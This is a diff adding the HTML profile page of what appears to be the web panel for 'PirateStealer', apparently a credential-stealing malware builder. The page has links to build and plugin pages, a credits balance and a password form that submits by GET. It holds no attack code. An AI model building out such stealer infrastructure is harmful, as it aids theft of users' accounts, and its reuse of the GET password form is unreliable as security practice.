@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>PirateStealer - Profile</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" media="screen" href="css/main.css" />
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+
+    <script src="js/particles.js"></script>
+    <script defer src="js/profile.js"></script>
+</head>
+
+<body>
+    <div class="floating_toolbar">
+        <div class="fbtl_container">
+            <a class="tool_button" href="https://discord.gg/grabber" target="_blank" rel="noopener">
+                <span class="material-icons">diamond</span>
+            </a>
+            <a class="tool_button" href="/home.html">
+                <span class="material-icons">home</span>
+            </a>
+            <a class="tool_button" href="/build.html">
+                <span class="material-icons">plumbing</span>
+            </a>
+            <a class="tool_button" href="/settings.html">
+                <span class="material-icons">tune</span>
+            </a>
+            <a class="tool_button" href="/plugins.html">
+                <span class="material-icons">extension</span>
+            </a>
+            <a class="tool_button" href="/login.html">
+                <span class="material-icons">login</span>
+            </a>
+        </div>
+    </div>
+
+    <main>
+        <img src="assets/Logo.png" class="logo" alt="Logo PirateStealer" draggable="false">
+        <div class="container">
+            <p class="field"><span class="important">Username:</span> Walidoux</p>
+            <p class="field">
+                <span class="important">UUID:</span> <span class="chars"
+                    id="UUID">6bd0acd7-6f8f-475c-b242-883fafb08a99</span>
+                <span class="text_clipboard" id="textClipboard">Copied !</span>
+            </p>
+            <p class="field"><span class="important">Stancredits:</span> 1000 $tancredits</p>
+            <button id="editPasswordButton">Edit Password</button>
+        </div>
+        <form method="GET" id="formChanges">
+            <span class="material-icons close_button" id="closeButton">close</span>
+            <input type="password" name="password" maxlength="32" placeholder="Old Password" required>
+            <input type="password" name="password" maxlength="32" placeholder="New Password" required>
+            <input type="submit" value="Confirmer">
+        </form>
+    </main>
+</body>
+
+</html>
